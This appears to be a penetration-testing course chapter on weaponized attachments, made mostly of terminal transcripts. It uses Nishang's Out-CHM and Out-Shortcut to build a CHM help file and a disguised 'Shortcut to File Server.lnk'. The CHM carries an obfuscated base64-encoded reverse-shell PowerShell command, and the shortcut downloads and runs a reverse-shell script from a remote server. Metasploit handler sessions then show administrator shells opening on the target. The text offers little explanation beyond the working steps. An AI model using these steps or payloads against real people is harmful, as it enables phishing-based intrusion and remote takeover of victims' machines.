#### 47. Client Side Attacks Part 2

###### Malicious/Weaponized Attachments

- Out-CHM
- Out-Shortcut

    - Out-CHM

	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Import-Module .\nishang.psm1
	WARNING: The names of some imported commands from the module 'nishang' include unapproved verbs that might make them less discoverable. To find the commands with unapproved verbs, run the Import-Module
	command again with the Verbose parameter. For a list of approved verbs, type Get-Verb.
	WARNING: Some imported command names contain one or more of the following restricted characters: # , ( ) {{ }} [ ] & - / \ $ ^ ; : " ' < > | ? @ ` * % + = ~
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Get-Help Out-CHM -Examples
	
	NAME
	    Out-CHM
	
	SYNOPSIS
	    Nishang script useful for creating Compiled HTML Help file (.CHM) which could be used to run PowerShell commands and scripts.
	
	    -------------------------- EXAMPLE 1 --------------------------
	
	    PS >Out-CHM -Payload "Get-Process" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
	
	
	    Above command would execute Get-Process on the target machine when the CHM file is opened.
	
	
	
	
	    -------------------------- EXAMPLE 2 --------------------------
	
	    PS >Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
	
	
	    Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it,
	    you must pass the parameters in the script itself.
	
	
	
	
	    -------------------------- EXAMPLE 3 --------------------------
	
	    PS >Out-CHM -PayloadURL http://192.168.254.1/Get-Information.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
	
	
	    Use above command to generate CHM file which download and execute the given PowerShell script in memory on target.
	
	
	
	
	    -------------------------- EXAMPLE 4 --------------------------
	
	    PS >Out-CHM -Payload "-EncodedCommand <>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
	
	
	    Use above command to generate CHM file which executes the encoded command/script.
	    Use Invoke-Encode from Nishang to encode the command or script.
	
	
	
	
	    -------------------------- EXAMPLE 5 --------------------------
	
	    PS >Out-CHM -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
	
	
	    Use above command to pass an argument to the PowerShell script/module.
	
	
	
	
	    -------------------------- EXAMPLE 6 --------------------------
	
	    PS >Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
	
	
	    Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it,
	    you must pass the parameters in the script itself.
	
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Out-CHM -Payload " -c Get-Process" -HHCPath 'C:\Program Files (x86)\HTML Help Workshop'
	Microsoft HTML Help Compiler 4.74.8702
	
	Compiling c:\Users\Administrator\Desktop\nishang-master\doc.chm
	
	
	Compile time: 0 minutes, 0 seconds
	2       Topics
	4       Local links
	4       Internet links
	0       Graphics
	
	
	Created c:\Users\Administrator\Desktop\nishang-master\doc.chm, 13,430 bytes
	Compression increased file by 291 bytes.
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> ls .\doc.chm
	
	
	    Directory: C:\Users\Administrator\Desktop\nishang-master
	
	
	Mode                LastWriteTime     Length Name
	----                -------------     ------ ----
	-a---         7/17/2017   1:52 PM      13430 doc.chm
	
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	[```mini-reverse.ps1```](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5)
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Invoke-Encode -DataToEncode ..\mini-reverse.ps1 -OutCommand
	Encoded data written to .\encoded.txt
	Encoded command written to .\encodedcommand.txt
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> cat .\encodedcommand.txt
	SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALg
	BEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAo
	ACcAagBWAFgAZgBiADkAbwB3AEUASAA0AHUARQB2ACsARABGADAAVQBqADAAYwBDAEQAcQB0AHAATAB0AFEAZgBXADAAcQBuAFMAQgBGAFAAcAAxAEkAZABwAFUAawBOAHkAQQBXAC8ARwBwAHIAYQB6AFUAbgBYADgANwB6AHYALwBBAEEAbwBOAEYAWQBrAFUASgBjAD
	cAMwAzAFgAMQAzADUAegB2AEgAVwB1AFoALwB3AEoARABQAFIATQBCAGoAUgAwADUAKwBRADIANwBJACsARQBrAGIAbQBOAE0AaABHAEQAcAAyAHYAegBXADkAegBSAGMAWABuAEkARQB3AFMAYQB2AFgAcABmAFkAKwA3AFgANQBxAHQAYwBrAFoAWAB1AGwANQBzADgA
	SABLAEoAQQA2AG0ATwB2AEIAQQBZAGwARgB4AG4AagA3AEQAawBoAG4AUwBXAHoAVQBiAHMAVABZAEsAcwBqAG0ANgBDAFMAagA2AEYAYwB6AFkAcgBTAFcAVwBIAGoAOABxAFoAawBEAFYAeQByAGcAZQBVAFkAKwA4AGMANQBnAGsAMgBIAEsAMABTAFYAVwBXAEIAMg
	BoAGYAbgBnAHoAOAAvAEUAVgA2ADMAZABNAHoAaQB3AFMAUgB5ADQASwBKAGEAUwAzADIARgBwAGEARwA5AG4AWABPADIAQwBEAEEAawBGAEwASQBaAHUATwA1ADIAVABnAEoAMgB1AGcAVgByAC8AVABNAHEAVAAyAEoAVQBVAEIAaABnADcARgBoAGgAZwBXAE4AMwAx
	AEcARQA3ADQAOAB6AHgAbQBHAHQAawBsADUAbQBKAHUAdgAvAHoAUgBqAFAASgBoAHgASQBSAHkAcgBpAHkAZABzAHMARQBlAHQAawBhAHoATAB3AGIAdgBBAHoAQwBmAEcAMQBTAGIAZgB0AEEAawBrAFIAdQBiAEwAdQBaAEcAVgBMAHQAZwBrAHEAWgBCAFAAZgBkAG
	kAagBPAFoAbwBxAG0ARgBqAHoATABJAFkAbgB1ADEAYgAyAEkAMgBsAEgAMABjAHMAawB2ADIAQgBpAHcAaABPACsAcwBZAFEAbwBQAFYAYwBaADEARQB0AG4AcQBSAFcAbgBxADUAVwBWAHEANgBpAE8AMABVAEkAdAAxADAARwB0AFIAdwBIAEoAVQBKAGkAMwBTAFMA
	awBsAG4AaQBzAFgAdgBlAGYAeQBHADQARwBDADYAbQB1AGcAZwBiADUALwAxAG8AZQBlAGMAbgAyAHgAaQAyAHMAVgAzADIANgA4AFkAQQBXADgAbABXAEIAOQBVAEwAegBnAHoANwBnAC8AbABJAEsAWgBtADUAbwBRADQASABXAFQAdgBpAGgAZABNAGwAQgBLADkARA
	BIAEUATABqAEgAYQAyAHcAQwBYAEwAcABrAEoAcQB3ADMASgBOAHYAeQB1AFoAZwA5AFoAagBrAHkAbAB6AGoAWQBSAEQAaAB1AGcAVgBWAG4AcQBZAHoAYwBFAG0ASgBwADgAWABGAEoAWQBRAEgAUQBUAGYAUQBNAEUAVQBlAGsAUwB6AG8AcwBoAFUATQBWAEIASwAy
	AHEAMABiAEcAMQBYAEIAMABhAHgAUgBaAFIAWQArAFUAVwAvAFMAZgBtAGcAWQB6ADQARAB6AHcAUgBMAHkAeQBsAGkAQgBjAFkAbABGAFAAVQB6AG8AcQAyAGsAMQB4AC8ANQAyAFIAZgA2AFkAdQB6AG8AUQBsACsARABhAGkASQA3AE4AWQBSADIAWABiAGgASgByAF
	oAVABuADMAaAAyAEYASgBTAHYANABSAEQATABvAHoAeABGADYAcABoAGQAMQBsAHoARgB4AEoATgBjAEQAZABtAHEAUQAxAEMARwAyAEsAcwBMAFcAYwB5AFIAZABaAGQARQAxADIASwB3AGUAaQBPAEUAUQBFAHAAWABhAEoAcgBtAGgAdgA4ADEAaABKAEUAbQBSAFkA
	UABSAGUAeQB3AEoANABYAFEATABxAHUAeQAvAGUAUgB6AG8AdQBmAEgATQBIAFoAYQA4AHkASwBBAEoAYgB0AEMARABiAEcAVwBNAE4AMgByAGUASwBmADEAbwA3AHYAegBmAFcANABTAHQANQBIAHQAcwB3AFIAaQBYAHkAaABiAGEAcgB4AHUAKwBOADcANwAzAHoATA
	BkAFkAOAB0AGYANAA5AGUAUQAxAHUAdABoADQAUgBGADIAZwBTAEUAQQAyAEcAcgBjAEQAMQBWADMAVgBEAC8AeABnAFEANABiAEUAagBuAHkAcwArADUAMQBaADAAZABwAGEAUgArAEwARwAwAE8ARABaAHAAegBxAGMARQBmAEkAKwBGAHcAZQBiAGsAUwB4AGoARABU
	AEMANwBmAFcAYgBQAHcASAAnACkAKQApACkALAAgAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALAAgAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG
	4AZwBdADoAOgBBAFMAQwBJAEkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Out-CHM " -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3
	AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHY
	AZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAagBWAFgAZgBiADkAbwB3AEUASAA0AHUARQB2ACsARABGADAAVQBqADAAYwBDAEQAcQB0AHAATAB0AFEAZgBXADAAcQBuAFMAQgBGAFAAcAAxAEkAZABwAFUAawBOAHkAQQBXAC8ARw
	BwAHIAYQB6AFUAbgBYADgANwB6AHYALwBBAEEAbwBOAEYAWQBrAFUASgBjADcAMwAzAFgAMQAzADUAegB2AEgAVwB1AFoALwB3AEoARABQAFIATQBCAGoAUgAwADUAKwBRADIANwBJACsARQBrAGIAbQBOAE0AaABHAEQAcAAyAHYAegBXADkAegBSAGMAWABuAEkARQB3A
	FMAYQB2AFgAcABmAFkAKwA3AFgANQBxAHQAYwBrAFoAWAB1AGwANQBzADgASABLAEoAQQA2AG0ATwB2AEIAQQBZAGwARgB4AG4AagA3AEQAawBoAG4AUwBXAHoAVQBiAHMAVABZAEsAcwBqAG0ANgBDAFMAagA2AEYAYwB6AFkAcgBTAFcAVwBIAGoAOABxAFoAawBEAFYA
	eQByAGcAZQBVAFkAKwA4AGMANQBnAGsAMgBIAEsAMABTAFYAVwBXAEIAMgBoAGYAbgBnAHoAOAAvAEUAVgA2ADMAZABNAHoAaQB3AFMAUgB5ADQASwBKAGEAUwAzADIARgBwAGEARwA5AG4AWABPADIAQwBEAEEAawBGAEwASQBaAHUATwA1ADIAVABnAEoAMgB1AGcAVgB
	yAC8AVABNAHEAVAAyAEoAVQBVAEIAaABnADcARgBoAGgAZwBXAE4AMwAxAEcARQA3ADQAOAB6AHgAbQBHAHQAawBsADUAbQBKAHUAdgAvAHoAUgBqAFAASgBoAHgASQBSAHkAcgBpAHkAZABzAHMARQBlAHQAawBhAHoATAB3AGIAdgBBAHoAQwBmAEcAMQBTAGIAZgB0AE
	EAawBrAFIAdQBiAEwAdQBaAEcAVgBMAHQAZwBrAHEAWgBCAFAAZgBkAGkAagBPAFoAbwBxAG0ARgBqAHoATABJAFkAbgB1ADEAYgAyAEkAMgBsAEgAMABjAHMAawB2ADIAQgBpAHcAaABPACsAcwBZAFEAbwBQAFYAYwBaADEARQB0AG4AcQBSAFcAbgBxADUAVwBWAHEAN
	gBpAE8AMABVAEkAdAAxADAARwB0AFIAdwBIAEoAVQBKAGkAMwBTAFMAawBsAG4AaQBzAFgAdgBlAGYAeQBHADQARwBDADYAbQB1AGcAZwBiADUALwAxAG8AZQBlAGMAbgAyAHgAaQAyAHMAVgAzADIANgA4AFkAQQBXADgAbABXAEIAOQBVAEwAegBnAHoANwBnAC8AbABJ
	AEsAWgBtADUAbwBRADQASABXAFQAdgBpAGgAZABNAGwAQgBLADkARABIAEUATABqAEgAYQAyAHcAQwBYAEwAcABrAEoAcQB3ADMASgBOAHYAeQB1AFoAZwA5AFoAagBrAHkAbAB6AGoAWQBSAEQAaAB1AGcAVgBWAG4AcQBZAHoAYwBFAG0ASgBwADgAWABGAEoAWQBRAEg
	AUQBUAGYAUQBNAEUAVQBlAGsAUwB6AG8AcwBoAFUATQBWAEIASwAyAHEAMABiAEcAMQBYAEIAMABhAHgAUgBaAFIAWQArAFUAVwAvAFMAZgBtAGcAWQB6ADQARAB6AHcAUgBMAHkAeQBsAGkAQgBjAFkAbABGAFAAVQB6AG8AcQAyAGsAMQB4AC8ANQAyAFIAZgA2AFkAdQ
	B6AG8AUQBsACsARABhAGkASQA3AE4AWQBSADIAWABiAGgASgByAFoAVABuADMAaAAyAEYASgBTAHYANABSAEQATABvAHoAeABGADYAcABoAGQAMQBsAHoARgB4AEoATgBjAEQAZABtAHEAUQAxAEMARwAyAEsAcwBMAFcAYwB5AFIAZABaAGQARQAxADIASwB3AGUAaQBPA
	EUAUQBFAHAAWABhAEoAcgBtAGgAdgA4ADEAaABKAEUAbQBSAFkAUABSAGUAeQB3AEoANABYAFEATABxAHUAeQAvAGUAUgB6AG8AdQBmAEgATQBIAFoAYQA4AHkASwBBAEoAYgB0AEMARABiAEcAVwBNAE4AMgByAGUASwBmADEAbwA3AHYAegBmAFcANABTAHQANQBIAHQA
	cwB3AFIAaQBYAHkAaABiAGEAcgB4AHUAKwBOADcANwAzAHoATABkAFkAOAB0AGYANAA5AGUAUQAxAHUAdABoADQAUgBGADIAZwBTAEUAQQAyAEcAcgBjAEQAMQBWADMAVgBEAC8AeABnAFEANABiAEUAagBuAHkAcwArADUAMQBaADAAZABwAGEAUgArAEwARwAwAE8ARAB
	aAHAAegBxAGMARQBmAEkAKwBGAHcAZQBiAGsAUwB4AGoARABUAEMANwBmAFcAYgBQAHcASAAnACkAKQApACkALAAgAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAH
	MAcwApACkALAAgAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA" -HHCPath 'C:\Program Files (x86)\HTML Help Workshop'
	Microsoft HTML Help Compiler 4.74.8702
	
	Compiling c:\Users\Administrator\Desktop\nishang-master\doc.chm
	
	
	Compile time: 0 minutes, 0 seconds
	2       Topics
	4       Local links
	4       Internet links
	0       Graphics
	
	
	Created c:\Users\Administrator\Desktop\nishang-master\doc.chm, 14,994 bytes
	Compression decreased file by 1,230 bytes.
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	Run ```doc.chm```
	
	```sh
	root@kali:~# msfconsole
	msf > use exploit/multi/handler
	msf exploit(handler) > set PAYLOAD windows/shell/reverse_tcp
	PAYLOAD => windows/shell/reverse_tcp
	msf exploit(handler) > set LHOST 10.0.0.206
	LHOST => 10.0.0.206
	msf exploit(handler) > set LPORT 4444
	LPORT => 4444
	msf exploit(handler) > show options
	
	Module options (exploit/multi/handler):
	
	   Name  Current Setting  Required  Description
	   ----  ---------------  --------  -----------
	
	
	Payload options (windows/shell/reverse_tcp):
	
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
	   LHOST     10.0.0.206       yes       The listen address
	   LPORT     4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Wildcard Target
	
	
	msf exploit(handler) > exploit
	
	[*] Started reverse TCP handler on 10.0.0.206:4444
	[*] Starting the payload handler...
	[*] Encoded stage with x86/shikata_ga_nai
	[*] Sending encoded stage (267 bytes) to 10.0.0.233
	[*] Command shell session 1 opened (10.0.0.206:4444 -> 10.0.0.233:51162) at 2017-07-17 17:13:28 -0400
	
	whoami
	pfpt\administrator
	```
	
	- Out-Shortcut

	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Get-Help Out-Shortcut -Examples
	
	NAME
	    Out-Shortcut
	
	SYNOPSIS
	    Nishang script which creates a shortcut capable of launching PowerShell commands and scripts.
	
	    -------------------------- EXAMPLE 1 --------------------------
	
	    PS >Out-Shortcut -Payload "-WindowStyle hidden -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"
	
	
	    Above command would execute Get-ChildItem on the target machine when the shortcut is opened. Note that powershell.exe is
	    not a part of the payload as the shortcut already points to it.
	
	
	
	
	    -------------------------- EXAMPLE 2 --------------------------
	
	    PS >Out-Shortcut -PayloadURL http://192.168.254.1/Get-Wlan-Keys.ps1
	
	
	    Use above command to generate a Shortcut which download and execute the given powershell script in memory on target.
	
	
	
	
	    -------------------------- EXAMPLE 3 --------------------------
	
	    PS >Out-Shortcut -Payload "-EncodedCommand <>"
	
	
	    Use above command to generate a Shortcut which executes the given encoded command/script.
	    Use Invoke-Encode from Nishang to encode the command or script.
	
	
	
	
	    -------------------------- EXAMPLE 4 --------------------------
	
	    PS >Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM
	
	
	    Use above command to pass an argument to the powershell script/module.
	
	
	
	
	    -------------------------- EXAMPLE 5 --------------------------
	
	    PS >Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HotKey 'F3'
	
	
	    Use above command to assign F3 as hotkey to the shortcut
	
	
	
	
	    -------------------------- EXAMPLE 6 --------------------------
	
	    PS >Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HotKey 'F3' -Icon 'notepad.exe'
	
	
	    Use above command to assign notepad icon to the generated shortcut.
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> Out-Shortcut -PayloadURL http://10.0.0.233:8000/mini-reverse.ps1
	The Shortcut file has been written as C:\Users\Administrator\Desktop\nishang-master\Shortcut to File Server.lnk
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	```PowerShell
	PS C:\Users\Administrator\Desktop\nishang-master> ls '.\Shortcut to File Server.lnk'
	
	    Directory: C:\Users\Administrator\Desktop\nishang-master
	
	
	Mode                LastWriteTime     Length Name
	----                -------------     ------ ----
	-a---         7/17/2017   3:21 PM       1544 Shortcut to File Server.lnk
	
	
	PS C:\Users\Administrator\Desktop\nishang-master>
	```
	
	Run ```Shortcut to File Server.lnk```
	
	```sh
	root@kali:~# msfconsole
	msf > use exploit/multi/handler
	msf exploit(handler) > set PAYLOAD windows/shell/reverse_tcp
	PAYLOAD => windows/shell/reverse_tcp
	msf exploit(handler) > set LHOST 10.0.0.206
	LHOST => 10.0.0.206
	msf exploit(handler) > set LPORT 4444
	LPORT => 4444
	msf exploit(handler) > show options
	
	Module options (exploit/multi/handler):
	
	   Name  Current Setting  Required  Description
	   ----  ---------------  --------  -----------
	
	
	Payload options (windows/shell/reverse_tcp):
	
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
	   LHOST     10.0.0.206       yes       The listen address
	   LPORT     4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Wildcard Target
	
	
	msf exploit(handler) > exploit
	
	[*] Started reverse TCP handler on 10.0.0.206:4444
	[*] Starting the payload handler...
	[*] Encoded stage with x86/shikata_ga_nai
	[*] Sending encoded stage (267 bytes) to 10.0.0.233
	[*] Command shell session 2 opened (10.0.0.206:4444 -> 10.0.0.233:16820) at 2017-07-17 18:21:50 -0400
	
	
	whoami
	pfpt\administrator
	```
	
	![Image of Target](images/18.jpeg)